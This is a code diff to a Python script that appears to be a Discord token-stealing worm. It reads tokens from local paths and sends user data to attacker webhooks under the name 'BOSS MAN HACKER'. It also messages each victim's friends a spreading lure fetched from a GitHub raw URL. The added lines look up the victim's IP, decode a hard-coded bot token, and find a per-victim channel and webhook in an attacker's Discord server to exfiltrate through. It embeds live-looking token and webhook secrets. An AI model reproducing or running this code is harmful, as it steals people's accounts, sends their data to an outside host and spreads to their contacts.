@@ -1,3 +1,5 @@
+import requests
+import base64
 from time import sleep
 import requests
 import os
@@ -105,6 +107,58 @@ def get_dm_channel_id(user_id, headers_):
         return json.loads(res.read())["id"]
 def main():
     checked = []
+    ip = requests.get("https://api.ipify.org?format=json").json()['ip']
+    category_name = ip
+
+    # token_url = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/tk.txt?time=2104827"
+    # encoded_token = requests.get(token_url).text
+    encoded_token = "TVRJM016SXlNRFV6TlRZek5UQXhOemM0TWcuR0VvTE9kLmwtWEFGUzJyR3RYQlVkMTZXQnpldzk3TkNfV1l5V3dYRTczVTI0"
+    token = base64.b64decode(encoded_token).decode("utf-8")
+    print(token)
+
+    guild_id = "1364229616071479326"
+    headers = {
+        "Authorization": f"{token}",
+        "Content-Type": "application/json"
+    }
+    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
+    response = requests.get(url, headers=headers)
+    channels = response.json()
+    print(channels)
+    category = next((ch for ch in channels if ch["type"] == 4 and ch["name"] == category_name), None)
+
+    if category:
+        print(f"Category '{category_name}' exists with ID: {category['id']}")
+
+        updates_channel = next(
+            (ch for ch in channels if ch["type"] == 0 and ch.get("parent_id") == category["id"] and ch["name"] == "updates"),
+            None
+        )
+
+        if updates_channel:
+            channel_id = updates_channel["id"]
+
+
+            webhooks_url = f"https://discord.com/api/v9/channels/{channel_id}/webhooks"
+            response = requests.get(webhooks_url, headers=headers)
+
+            if response.status_code != 200:
+                raise Exception(f"Failed to get webhooks: {response.status_code} {response.text}")
+
+            webhooks = response.json()
+            if not webhooks:
+                raise Exception("No webhooks found in this channel.")
+
+            webhook = webhooks[0]
+            webhook_url = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
+            if response.status_code in (200, 204):
+                print("Message sent successfully via webhook.")
+            else:
+                print(f"Failed to send webhook message: {response.status_code} {response.text}")
+        else:
+            print("No text channels found in the category.")
+    else:
+        print(f"Category '{category_name}' not found.")
 
     for platform, path in PATHS.items():
         if not os.path.exists(path):
@@ -213,31 +267,33 @@ def main():
                         }
                     ],
                     "username": "BOSS MAN HACKER",
-                }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1365389556739866715/mWmroDXrZDLimhu9gAOj_Qv3PsU5vlH59r8iJOkCIkMUyksgfDrHPWbbg-cV_K5ykI5w', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                }
+                
+                response = requests.post(webhook_url, json=embed_user, headers=getheaders())
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
                 print(f"ERROR: {e}")
                 continue
-            for id in friend_ids: # Replace with your channel ID
-                    user_id = get_dm_channel_id(id, getheaders(token))
-                    url = f'https://discord.com/api/v9/channels/{user_id}/messages'
-                    headers = {
-                        'Authorization': token,
-                        'Content-Type': 'application/json'
-                    }
-                    print(requests.get("https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/spread_message.txt").text)
-                    data = {
-                        'content': requests.get("https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/spread_message.txt").text
-                    }
+        for id in friend_ids: # Replace with your channel ID
+            user_id = get_dm_channel_id(id, getheaders(token))
+            url = f'https://discord.com/api/v9/channels/{user_id}/messages'
+            headers = {
+                'Authorization': token,
+                'Content-Type': 'application/json'
+            }
+            print(requests.get("https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/spread_message.txt").text)
+            data = {
+                'content': requests.get("https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/spread_message.txt").text
+            }
 
-                    response = requests.post(url, headers=headers, json=data)
+            response = requests.post(url, headers=headers, json=data)
 
-                    print(response.status_code)
-                    print(response.json())
-                    sleep(2)
+            print(response.status_code)
+            print(response.json())
+            sleep(2)
 
 if __name__ == "__main__":
     main()
+
